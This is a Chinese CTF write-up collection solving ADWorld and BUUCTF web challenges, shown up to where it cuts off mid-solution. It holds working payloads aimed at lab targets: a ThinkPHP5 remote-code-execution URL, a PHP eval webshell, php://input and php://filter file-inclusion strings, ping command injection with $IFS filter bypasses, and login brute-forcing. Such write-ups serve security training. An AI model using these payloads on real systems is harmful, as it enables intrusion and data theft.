# Web

## ADWorld

### [view_source](https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=0&id=5061)

直接`view-source:http://111.200.241.244:58282/`即可查看源码发现鼠标右键菜单被禁用啦。当然你也可以尝试`F12`。

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Where is the FLAG</title>
</head>
<body>
<script>
document.oncontextmenu=new Function("return false")
document.onselectstart=new Function("return false")
</script>
<h1>FLAG is not here</h1>
<!-- cyberpeace{0ecea0641057535f961556bb4c0e3bd0} -->
</body>
</html>
```

------

### [robots](https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=0&id=5063)

`dirsearch -u http://111.200.241.244:60105/`扫描靶机发现网站目录下有个名为`robots.txt`的文件。

![](https://paper.tanyaodan.com/ADWorld/web/5063/1.png)

访问`http://111.200.241.244:60105/robots.txt`后发现另一个文件`f1ag_1s_h3re.php`。

![](https://paper.tanyaodan.com/ADWorld/web/5063/2.png)

访问`http://111.200.241.244:60105/f1ag_1s_h3re.php`后得到`cyberpeace{4a262386808d63cf055543bc2caea780}`。

![](https://paper.tanyaodan.com/ADWorld/web/5063/3.png)

------

### [backup](https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=0&id=5064)

`dirsearch -u http://111.200.241.244:55833/`扫描靶机发现网站目录下有个名为`index.php.bak`的文件。

![](https://paper.tanyaodan.com/ADWorld/web/5064/1.png)

将`index.php.bak`文件下载后用`Sublime Text`打开即可得到`Cyberpeace{855A1C4B3401294CB6604CCC98BDE334}`。

![](https://paper.tanyaodan.com/ADWorld/web/5064/2.png)

------

### [cookie](https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=0&id=5065)

打开靶机后可以看到一行信息：`你知道什么是cookie吗？`用`Burp Suite`抓包后`Send to Repeater`，接着再`Send Request`即可在右侧的`Response`中看到`flag`：`cyberpeace{b40aedb023a3f5e8139db61290274fd5}`。

![](https://paper.tanyaodan.com/ADWorld/web/5065/1.png)

------

### [disabled_button](https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=0&id=5066)

`view-source:http://111.200.241.244:63058/`查看网页源码如下：

```html
<html>
<head>
    <meta charset="UTF-8">
    <title>一个不能按的按钮</title>
    <link href="http://libs.baidu.com/bootstrap/3.0.3/css/bootstrap.min.css" rel="stylesheet" />
    <style>
        body{
            margin-left:auto;
            margin-right:auto;
            margin-TOP:200PX;
            width:20em;
        }
    </style>
</head>
<body>
<h3>一个不能按的按钮</h3>
<form action="" method="post" >
<input disabled class="btn btn-default" style="height:50px;width:200px;" type="submit" value="flag" name="auth" />
</form>
</body>
</html>
```

`F12`检查按钮将`<input>`标签中的`disabled`删除掉，再点击按钮即可得到`cyberpeace{84636369beba359c6f1e0d9f304a9a6d}`。

------

### [weak_auth](https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=0&id=5069)

打开靶机后随便输入账号密码便会提示账号应该是`admin`。用`Burp Suite`抓包后`Send to Intruder`，在`Payload Positions`中设置`Attack type`为`Sniper`，并添加`username=admin & password=§1§`，在`Payload Set`中添加字典进行爆破，最后得到密码为`123456`。在靶机中输入账号`admin`和密码`123456`即可得到`cyberpeace{a4f2ecbfdcd552b9eb8c7a920c604556}`。

------

### [simple_php](https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=0&id=5072)

`PHP`代码审计题。靶机中给出的`PHP`代码如下，我直接在源码中写注释啦：

```php
<?php
show_source(__FILE__);
include("config.php");
$a=@$_GET['a'];
$b=@$_GET['b'];
if($a==0 and $a){  //同时满足$a==0和$a时显示flag1
    echo $flag1;
}
if(is_numeric($b)){ //
    exit();
}
if($b>1234){
    echo $flag2;
}
?>
```

由于`PHP`是弱类型语言，所以当`$a=fuck`时`'fuck'==0`为真，可以得到`flag1`。`is_numeric()`函数用于判断变量是否为数字或数字字符串，是则返回`true`，否则返回`FALSE`，当`$b=6666r`时`is_numeric($b)`会返回真并且`'6666r'>1234`为真，从而得到`flag2`，因此直接访问`http://111.200.241.244:56134/?a=fuck&b=6666r`就能得到`Cyberpeace{647E37C7627CC3E4019EC69324F66C7C}`。

![](https://paper.tanyaodan.com/ADWorld/web/5072/1.png)

------

### [get_post](https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=0&id=5062)

访问靶机可以看到：`请用GET方式提交一个名为a,值为1的变量`，访问`http://111.200.241.244:55979/?a=1`可以看到`请再以POST方式随便提交一个名为b,值为2的变量`，`F12`用`HackBar`来添加`POST`请求数据`b=2`即可得到`cyberpeace{5c2ef3d86768127bbaccfc5cb2eb143d}`。

![](https://paper.tanyaodan.com/ADWorld/web/5062/1.png)

------

### [xff_referer](https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=0&id=5068)

访问靶机看到提示`ip地址必须为123.123.123.123`，打开`Burp Suite`抓包，添加`X-Forwarded-For: 123.123.123.123`后`send Request`看到提示`必须来自https://www.google.com`，继续添加`Referer: https://www.google.com`即可在`Response`中看到`cyberpeace{da1117a6b680354278869a08c728e227}`。

------

### [webshell](https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=0&id=5070)

打开靶机看到以下信息：

```php+HTML
你会使用webshell吗？
<?php @eval($_POST['shell']);?>
```

打开`AntSword`挥动俺的蚁剑，一句话木马告诉了靶机的连接密码是`shell`，连接成功后可以看到`flag.txt`文件，查看后即可得到`cyberpeace{081245a68c219586f459156b3d8c7051}`。

![](https://paper.tanyaodan.com/ADWorld/web/5070/1.png)

------

### [command_execution](https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=0&id=5071)

先来简单了解一下`Command`的四种执行方式：

```
command1 & command2 ：不管command1执行成功与否，都会执行command2，并且将上一个命令的输出作为下一个命令的输入
command1 && command2 ：先执行command1执行成功后才会执行command2，若command1执行失败，则不执行command2
command1 | command2 ：只执行command2
command1 || command2 ：command1执行失败，再执行command2(若command1执行成功，就不再执行command2)
```

然后这一题只需要无脑爆破就完事了，输入`127.0.0.1 | ls`后点击`PING`发现回显如下：

```bash
ping -c 3 127.0.0.1 | ls
index.php
```

显然网站目录下并没有`flag`相关文件，输入`127.0.0.1 | ls /`后点击`PING`发现回显如下：

```bash
ping -c 3 127.0.0.1 | ls /
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
run.sh
sbin
srv
sys
tmp
usr
var
```

首先访问`home`来查看有无`flag`相关信息，输入`127.0.0.1 | ls /home`后点击`PING`发现回显如下：

```bash
ping -c 3 127.0.0.1 | ls /home
flag.txt
```

好家伙！果断输入`127.0.0.1 | cat /home/flag.txt`后点击`PING`发现回显如下：

```bash
ping -c 3 127.0.0.1 | cat /home/flag.txt
cyberpeace{a3da29df7d0cd9ad500448f96ea9159b}
```

提交`cyberpeace{a3da29df7d0cd9ad500448f96ea9159b}`即可。

------

### [simple_js](https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=0&id=5067)

关闭弹出来的输入框，查看靶机源码如下：

```html
<html>
<head>
    <title>JS</title>
    <script type="text/javascript">
    function dechiffre(pass_enc){
        var pass = "70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65";
        var tab  = pass_enc.split(',');
                var tab2 = pass.split(',');var i,j,k,l=0,m,n,o,p = "";i = 0;j = tab.length;
                        k = j + (l) + (n=0);
                        n = tab2.length;
                        for(i = (o=0); i < (k = j = n); i++ ){o = tab[i-l];p += String.fromCharCode((o = tab2[i]));
                                if(i == 5)break;}
                        for(i = (o=0); i < (k = j = n); i++ ){
                        o = tab[i-l];
                                if(i > 5 && i < k-1)
                                        p += String.fromCharCode((o = tab2[i]));
                        }
        p += String.fromCharCode(tab2[17]);
        pass = p;return pass;
    }
    String["fromCharCode"](dechiffre("\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30"));
    h = window.prompt('Enter password');
    alert( dechiffre(h) );
</script>
</head>
</html>
```

编写`Python`代码来解码那一串字符串，从而得到`Cyberpeace{786OsErtk12}`。

```python
s = '\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30'
l = s.split(',')
flag = ''
for x in l:
    flag += chr(int(x))
flag = 'Cyberpeace{%s}'%flag
print(flag)  #Cyberpeace{786OsErtk12}
```

------

### [baby_web](https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5411)

题目描述：`想想初始页面是哪个`。然而直接访问靶机`/index.php`会被重定向到`1.php`，那不好意思，那我只能`Burp Suite`抓包了，`Send to Repeater`后`Send Request`即可在`Response`中的`HTTP`头中看到`flag{very_baby_web}`。

![](https://paper.tanyaodan.com/ADWorld/web/5411/1.png)

------

### [Training-WWW-Robots](https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=4748)

靶机中给出的信息如下：

```html
In this little training challenge, you are going to learn about the Robots_exclusion_standard.
The robots.txt file is used by web crawlers to check if they are allowed to crawl and index your website or only parts of it.
Sometimes these files reveal the directory structure instead protecting the content from being crawled.

Enjoy!
```

直接访问`http://111.200.241.244:49579/robots.txt`，可以看到以下信息：

```html
User-agent: *
Disallow: /fl0g.php

User-agent: Yandex
Disallow: *
```

访问`http://111.200.241.244:49579/fl0g.php`即可拿到`cyberpeace{abe0ddcfd221dc9db56b6551842a5fa0}`。

------

### [php_rce](https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5412)

这是一个远程代码执行漏洞。访问`http://111.200.241.244:62916/?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1`时可以成功执行`phpinfo`。访问`http://111.200.241.244:62916/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls`可以看到网站的文件目录，不过并没有`flag`信息。访问`http://111.200.241.244:62916/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls%20/`可以看到靶机服务器的根目录下有一个`flag`文件，好家伙！访问`http://111.200.241.244:62916/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat%20/flag`即可得到`flag{thinkphp5_rce}`。

------

### [Web_php_include](https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5415)

根据靶机给出的`PHP`源码信息可知page传参`php://`会被过滤掉，不过`strstr()`函数用于查找字符串首次出现的位置，`str_replace()`函数用来替换目标字符，这两个函数都是区分大小写字母的，因此我们可以用`PHP://`来绕开这个过滤。

```php
<?php
show_source(__FILE__);
echo $_GET['hello'];
$page=$_GET['page'];
while (strstr($page, "php://")) {
    $page=str_replace("php://", "", $page);
}
include($page);
?>
```

用`Burp Suite`抓包`http://111.200.241.244:56744/?page=PHP://input`添加`<?php system("ls"); ?>`即可在靶机执行`ls`命令。

![](https://paper.tanyaodan.com/ADWorld/web/5415/1.png)

可以看到网站目录下有个`fl4gisisish3r3.php`，如果直接访问的话没用，需要用`<?php system("cat fl4gisisish3r3.php"); ?>`在靶机执行`cat fl4gisisish3r3.php`命令才能得到`ctf{876a5fca-96c6-4cbd-9075-46f0c89475d2}`。

![](https://paper.tanyaodan.com/ADWorld/web/5415/2.png)

------

### [PHP2](https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=4820)

`dirsearch -u http://111.200.241.244:57993/`扫描网站目录发现有个名为`index.phps`的文件。

![](https://paper.tanyaodan.com/ADWorld/web/4820/1.png)

访问`http://111.200.241.244:57993/index.phps`发现代码如下：

```php
<?php
if("admin"===$_GET[id]) {
  echo("<p>not allowed!</p>");
  exit();
}

$_GET[id] = urldecode($_GET[id]);
if($_GET[id] == "admin")
{
  echo "<p>Access granted!</p>";
  echo "<p>Key: xxxxxxx </p>";
}
?>

Can you anthenticate to this website?
```

首先要让`"admin"===$_GET[id]`这个判断条件不成立，我们可以对`admin`进行`url`编码，当然也可以对其中一个字母`a`进行`url`编码，得到`%61dmin`，因为在访问链接时，会进行一次`url`解码，所以还需要对`%61dmin`再进行一次`url`编码得到`%2561dmin`，而`%25`在经过一次`url`解码后就是`%`，所以访问`http://111.200.241.244:57993/index.php?id=%2561dmin`即可得到`cyberpeace{58ce43c6c7b89495d5dcc2a10e87aa11}`。

------

## BUUCTF

### [[ACTF2020 新生赛]Include](https://buuoj.cn/challenges#[ACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B]Include)

加上`?file=php://filter/read=convert.base64-encode/resource=flag.php`，可以得到一串base64加密的数据`PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7ODc4ZjlkODEtZTY0NC00Njk4LWIzOGYtYjBiZTRlZjk5NzljfQo=`，解码就可以得到如下数据：

```php
<?php
echo "Can you find out the flag?";
//flag{878f9d81-e644-4698-b38f-b0be4ef9979c}
```

------

### [BSidesCF 2020]Had a bad day

打开靶机后，发现两个按钮`Woofers`和`Meowers`。按下`Woofers`会出现狗的图片，按下`Meowers`会出现猫的图片，并且`url`中会出现参数`?category=woofers`或`?category=meowers`。

想办法查看`index.php`的文件内容。

```php
/index.php?category=php://filter/convert.base64-encode/resource=index.php
```

靶机报错信息如下，看到`index.php.php`，就知道我们传参时需要删除`.php`后缀。

> **Warning**: include(php://filter/convert.base64-encode/resource=index.php.php): failed to open stream: operation failed in **/var/www/html/index.php** on line **37**
>
> **Warning**: include(): Failed opening 'php://filter/convert.base64-encode/resource=index.php.php' for inclusion (include_path='.:/usr/local/lib/php') in **/var/www/html/index.php** on line **37**

```
/index.php?category=php://filter/convert.base64-encode/resource=index
```

靶机显示信息中会包含`base64`编码信息。

直接在`cmd`命令行用`php -r "var_dump(base64_decode(''));"`进行`base64`解码，得到源码信息。

```php+HTML
string(3016) "<html>
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="description" content="Images that spark joy">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
    <title>Had a bad day?</title>
    <link rel="stylesheet" href="css/material.min.css">
    <link rel="stylesheet" href="css/style.css">
  </head>
  <body>
    <div class="page-layout mdl-layout mdl-layout--fixed-header mdl-js-layout mdl-color--grey-100">
      <header class="page-header mdl-layout__header mdl-layout__header--scroll mdl-color--grey-100 mdl-color-text--grey-800">
        <div class="mdl-layout__header-row">
          <span class="mdl-layout-title">Had a bad day?</span>
          <div class="mdl-layout-spacer"></div>
        <div>
      </header>
      <div class="page-ribbon"></div>
      <main class="page-main mdl-layout__content">
        <div class="page-container mdl-grid">
          <div class="mdl-cell mdl-cell--2-col mdl-cell--hide-tablet mdl-cell--hide-phone"></div>
          <div class="page-content mdl-color--white mdl-shadow--4dp content mdl-color-text--grey-800 mdl-cell mdl-cell--8-col">
            <div class="page-crumbs mdl-color-text--grey-500">
            </div>
            <h3>Cheer up!</h3>
              <p>
                Did you have a bad day? Did things not go your way today? Are you feeling down? Pick an option and let the adorable images cheer you up!
              </p>
              <div class="page-include">
              <?php
                $file = $_GET['category'];
                if(isset($file))
                {
                    if( strpos( $file, "woofers" ) !==  false || strpos( $file, "meowers" ) !==  false || strpos( $file, "index")){
                        include ($file . '.php');
                    }
                    else{
                        echo "Sorry, we currently only support woofers and meowers.";
                    }
                }
                ?>
                </div>
          <form action="index.php" method="get" id="choice">
              <center><button onclick="document.getElementById('choice').submit();" name="category" value="woofers" class="mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect" data-upgraded=",MaterialButton,MaterialRipple">Woofers<span class="mdl-button__ripple-container"><span class="mdl-ripple is-animating" style="width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);"></span></span></button>
              <button onclick="document.getElementById('choice').submit();" name="category" value="meowers" class="mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect" data-upgraded=",MaterialButton,MaterialRipple">Meowers<span class="mdl-button__ripple-container"><span class="mdl-ripple is-animating" style="width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);"></span></span></button></center>
          </form>
          </div>
        </div>
      </main>
    </div>
    <script src="js/material.min.js"></script>
  </body>
</html>"
```

其中，`PHP`代码部分如下：

```php
<?php
    $file = $_GET['category'];
    if(isset($file))
    {
        if( strpos( $file, "woofers" ) !==  false || strpos( $file, "meowers" ) !==  false || strpos( $file, "index")){
            include($file . '.php');
        }
        else{
            echo "Sorry, we currently only support woofers and meowers.";
        }
    }
?>
```

输入参数只有包含`woofers`，`meowers`和`index`时才会调用`include($file . '.php');`包含文件。

`strpos()`函数是返回在输入字符串中第一次找到指定字符或字符串的位置，没找到就返回`false`。

我们可以用`/resource=index/../flag`或`index/resource=flag`进行绕过，后者会多两行报错信息。

```php
?category=php://filter/read=convert.base64-encode/resource=index/../flag
```

```php
?category=php://filter/read=convert.base64-encode/index/resource=flag
```

靶机信息如下：

> PCEtLSBDYW4geW91IHJlYWQgdGhpcyBmbGFnPyAtLT4KPD9waHAKIC8vIGZsYWd7NmYxYTUyMWQtNWQ4YS00MTEwLWEwN2ItOWNhMmY5OGVlMGZjfQo/Pgo=

直接在`cmd`命令行用`php -r "var_dump(base64_decode(''));"`进行`base64`解码，得到源码信息。

```bash
C:\Users\tyd>php -r "var_dump(base64_decode('PCEtLSBDYW4geW91IHJlYWQgdGhpcyBmbGFnPyAtLT4KPD9waHAKIC8vIGZsYWd7NmYxYTUyMWQtNWQ4YS00MTEwLWEwN2ItOWNhMmY5OGVlMGZjfQo/Pgo='));"
string(89) "<!-- Can you read this flag? -->
<?php
 // flag{6f1a521d-5d8a-4110-a07b-9ca2f98ee0fc}
?>
"
```

提交`flag{6f1a521d-5d8a-4110-a07b-9ca2f98ee0fc}`即可。

------

### BUU BURP COURSE 1

#### 解法一：HackBar

打开靶机后只有一行文字。

```
只能本地访问。
```

用`HackBar`添加`X-Forward-For: 127.0.0.1`后还是不行，添加`X-Real-IP: 127.0.0.1`后看到一个记住密码的登录界面，账号密码默认填写，查看源码后拿到`username`和`password`，填入`Body`中，`POST`请求后显示登录成功，拿到`flag`。

------

#### 解法二：Python

编写`python`代码求解。

```python
import requests

url = 'http://node5.buuoj.cn:28701/'
headers={'X-Forwarded-For':'127.0.0.1', 'X-Real-IP':'127.0.0.1'}
r = requests.get(url, headers=headers)
print(r.text)

data = {
    'username':'admin', 
    'password':'wwoj2wio2jw93ey43eiuwdjnewkndjlwe'
}
r = requests.post(url, headers=headers, data=data)
print(r.text)
'''
登录成功！flag{d0a6aefb-d565-4871-944a-ed1f63096948}
'''
```

运行代码得到以下内容：

```html
<!DOCTYPE html>
<html lang="zh-cn">
<head>
    <meta charset="UTF-8">
    <title>登录</title>
</head>
<body>
<div style="text-align: center">
    <form action="" method="post">
        用户名：<input type="text" name="username" value="admin"/><br>
        密码：<input type="password" name="password" value="wwoj2wio2jw93ey43eiuwdjnewkndjlwe"/><br>
        <input type="submit" value="登录"/>
    </form>
</div>
</body>
</html>
```

继续编写`python`代码，将账号密码填入`data`中发送`POST`请求。

```python
import requests

url = 'http://node5.buuoj.cn:28701/'
headers={'X-Forwarded-For':'127.0.0.1', 'X-Real-IP':'127.0.0.1'}
# r = requests.get(url, headers=headers)
# print(r.text)

data = {
    'username':'admin', 
    'password':'wwoj2wio2jw93ey43eiuwdjnewkndjlwe'
}
r = requests.post(url, headers=headers, data=data)
print(r.text)
'''
登录成功！flag{d0a6aefb-d565-4871-944a-ed1f63096948}
'''
```

提交`flag`即可。

#### 解法三：BurpSuite

`Burp Suite`抓包，添加`X-Real-IP: 127.0.0.1`后发送`GET`请求。

```
GET / HTTP/1.1
Host: node5.buuoj.cn:28701
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
X-Real-IP: 127.0.0.1
Connection: keep-alive
```

`Forward`后看到默认填写账号密码的页面，继续抓包，添加`X-Real-IP: 127.0.0.1`后放行`POST`请求。

```
POST / HTTP/1.1
Host: node5.buuoj.cn:28702
Content-Length: 57
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Origin: http://node5.buuoj.cn:28702
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://node5.buuoj.cn:28702/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
X-Real-IP: 127.0.0.1
Connection: keep-alive

username=admin&password=wwoj2wio2jw93ey43eiuwdjnewkndjlwe
```

成功拿到`flag`。

```
HTTP/1.1 200 OK
Server: nginx/1.14.2
Date: Wed, 10 Dec 2025 04:07:19 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
X-Powered-By: PHP/7.3.5
Content-Length: 58

登录成功！flag{d0a6aefb-d565-4871-944a-ed1f63096948}
```

------

### [[极客大挑战 2019]Http](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Http)

#### 解法1：BurpSuite

直接`view-source:http://node4.buuoj.cn:25280/`查看源码，可以找到这样一段代码：

```html
<div class="content">
  <h2>小组简介</h2>
  <p>·成立时间：2005年3月<br /><br />
     ·研究领域：渗透测试、逆向工程、密码学、IoT硬件安全、移动安全、安全编程、二进制漏洞挖掘利用等安全技术<br /><br />
     ·小组的愿望：致力于成为国内实力强劲和拥有广泛影响力的安全研究团队，为广大的在校同学营造一个良好的信息安全技术
     <a style="border:none;cursor:default;" onclick="return false" href="Secret.php">氛围</a>！
  </p>
</div>
```

点击`Secret.php`可以看到一行很大的文字`It doesn't come from 'https://www.Sycsecret.com'`。

`BurpSuite`抓包新增`Referer:www.Sycsecret.com`后又出现了一行新的文字，`Please use "Syclover" browser`。

继续用`BurpSuite`将`User-Agent`修改为 `Syclover`后又出现了一行新的文字`No!!! you can only read this locally!!!`。

用`BurpSuite`添加`X-Forwarded-For:127.0.0.1`后可以拿到`flag`。

#### 解法2：Golang

```go
package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
)

func httpRequest(url string) (*http.Response, error) {
	request, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil, err
	}
	request.Header.Add("Referer", "https://www.Sycsecret.com")
	request.Header.Add("User-Agent", "Syclover")
	request.Header.Add("X-Forwarded-For", "127.0.0.1")
	client := http.Client{}
	return client.Do(request)
}

func main() {
	response, err := httpRequest("http://node4.buuoj.cn:25280/Secret.php")
	if err != nil {
		fmt.Printf("http get error: %s", err)
		return
	}
	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		fmt.Printf("read error: %s", err)
	}
	fmt.Println(string(body))
}
```

#### 解法3：Python

```python
import requests

url = 'http://node4.buuoj.cn:25280/Secret.php'
headers={'Referer':'https://www.Sycsecret.com'}
headers['User-Agent'] = "Syclover"
headers['X-Forwarded-For'] = '127.0.0.1'
r = requests.get(url,headers=headers)
with open("1.html",'w') as f:
    f.write(r.text)
```

输出的`html`页面如下，可以看到`flag`：

```html
<!DOCTYPE html>
<html>

<style>
    .slickButton3 {
        margin-right:20px;
        margin-left:20px;
        margin-top:20px;
        margin-bottom:20px;
        color: white;
        font-weight: bold;
        padding: 10px;
        border: solid 1px black;
        background: #111111;
        cursor: pointer;
        transition: box-shadow 0.5s;
        -webkit-transition: box-shadow 0.5s;
    }

    .slickButton3:hover {
        box-shadow:4px 4px 8px #00FFFF;
    }
    img {
        position:absolute;
        left:20px;
        top:0px;
    }
    p {
        cursor: default;
    }
    .input{
        border: 1px solid #ccc;
        padding: 7px 0px;
        border-radius: 3px;
        padding-left:5px;
        -webkit-box-shadow: inset 0 1px 1px rgba(0,0,0,.075);
        box-shadow: inset 0 1px 1px rgba(0,0,0,.075);
        -webkit-transition: border-color ease-in-out .15s,-webkit-box-shadow ease-in-out .15s;
        -o-transition: border-color ease-in-out .15s,box-shadow ease-in-out .15s;
        transition: border-color ease-in-out .15s,box-shadow ease-in-out .15s
    }
    .input:hover{
        border-color: #808000;
        box-shadow: 0px 0px 8px #7CFC00;
    }  
</style>

<head>
        <meta charset="UTF-8">
        <title>SycSecret</title>
</head>
<body background="./images/background.png" style="background-repeat:no-repeat ;background-size:100% 100%; background-attachment: fixed;" >

</br></br></br></br></br></br></br></br></br></br></br></br>
<h1 style="font-family:arial;color:#8E44AD;font-size:50px;text-align:center;font-family:KaiTi;">
flag{2f1ec631-f839-4d42-8413-b790506989a7}
</h1>
<div style="position: absolute;bottom: 0;width: 99%;"><p align="center" style="font:italic 15px Georgia,serif;color:white;"> Syclover @ cl4y</p></div>
</body>
</html>
```

#### python直接出flag

```python
import requests
from bs4 import BeautifulSoup

url = 'http://node5.buuoj.cn:26591/Secret.php'
headers = {
    'Referer': 'https://Sycsecret.buuoj.cn',
    'User-Agent': 'Syclover',
    'X-Forwarded-For': 'localhost'
}
r = requests.get(url, headers=headers)
# print(r.text)
soup = BeautifulSoup(r.text, 'html.parser')
flag = soup.h1.text.strip()
print(flag)  # flag{41738a8c-6e6c-44cd-a877-6f08ad8ba59d} 
```

------

### [[GXYCTF2019]Ping Ping Ping](https://buuoj.cn/challenges#[GXYCTF2019]Ping%20Ping%20Ping)

靶机给出的信息如下：

```
/?ip=
```

访问`/?ip=127.0.0.1`测试一下可以看到以下信息：

```bash
PING 127.0.0.1 (127.0.0.1): 56 data bytes
```

这是`Linux`命令执行，尝试使用管道符 `|` 来用`ls`显示当前目录的所有文件，访问`/?ip=127.0.0.1|ls`可以看到如下信息：

```
/?ip=
flag.php
index.php
```

直接`/?ip=127.0.0.1|cat flag.php`企图拿到`flag`，结果实际访问的是`/?ip=127.0.0.1|cat%20flag.php`，看到了如下信息：

```
/?ip= fxck your space!
```

艹被骂了，查阅资料后看到了一些输入空格的方法：

> `$IFS`	  //在这道题里不知道为什么不行
> `${IFS}`
> `$IFS$1`  //$1改成$加其他数字都行
> < 
> <> 
> {cat,flag.php}  //用逗号实现了空格功能
> %20 
> %09 

访问`/?ip=127.0.0.1|cat$IFS$1flag.php`再次查看还是被骂，那看看另一个文件，`/?ip=127.0.0.1|cat$IFS$1index.php`，可以看到以下信息：

```php
/?ip=
|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
    echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
    die("fxck your symbol!");
  } else if(preg_match("/ /", $ip)){
    die("fxck your space!");
  } else if(preg_match("/bash/", $ip)){
    die("fxck your bash!");
  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
    die("fxck your flag!");
  }
  $a = shell_exec("ping -c 4 ".$ip);
  echo "
";
  print_r($a);
}

?>
```

这怎么显示得不全？！`view-source`查看源码可以看到以下信息：

```php
/?ip=
<pre>/?ip=
<?php
if(isset($_GET['ip'])){
  $ip = $_GET['ip'];
  if(preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{1f}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
    echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
    die("fxck your symbol!");
  } else if(preg_match("/ /", $ip)){
    die("fxck your space!");
  } else if(preg_match("/bash/", $ip)){
    die("fxck your bash!");
  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
    die("fxck your flag!");
  }
  $a = shell_exec("ping -c 4 ".$ip);
  echo "<pre>";
  print_r($a);
}

?>
```

利用变量拼接绕过，可以拿到`flag`。

```
view-source:81def8b2-1bd9-4d67-9e1c-9f6b395b6b18.node4.buuoj.cn:81/?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php
```

看到一个大佬的解法：使用反引号`` 代替 | 内联执行，，将反引号内命令的输出作为输入执行，即把ls的结果作为cat的参数进行执行。

```
view-source:http://81def8b2-1bd9-4d67-9e1c-9f6b395b6b18.node4.buuoj.cn:81/?ip=127.0.0.1;cat$IFS$1`ls`
```

------

### [BUU CODE REVIEW 1](https://buuoj.cn/challenges#BUU%20CODE%20REVIEW%201)

靶机给出的`PHP`代码如下：

```php
<?php
/**
 * Created by PhpStorm.
 * User: jinzhao
 * Date: 2019/10/6
 * Time: 8:04 PM
 */
highlight_file(__FILE__);
class BUU {
   public $correct = "";
   public $input = "";
   public function __destruct() {
       try {
           $this->correct = base64_encode(uniqid());
           if($this->correct === $this->input) {
               echo file_get_contents("/flag");
           }
       } catch (Exception $e) {
       }
   }
}

if($_GET['pleaseget'] === '1') {
    if($_POST['pleasepost'] === '2') {
        if(md5($_POST['md51']) == md5($_POST['md52']) && $_POST['md51'] != $_POST['md52']) {
            unserialize($_POST['obj']);
        }
    }
}
```

`GET`提交：`?pleaseget=1`，用`Hackbar`来提交`POST`数据`pleasepost=2&md51=s878926199a&md52=s155964671a`。

编写`PHP`代码获得`obj`的数据：

```php
<?php
class BUU{
    public $correct = "";
    public $input = "";
}
$chen = new BUU();
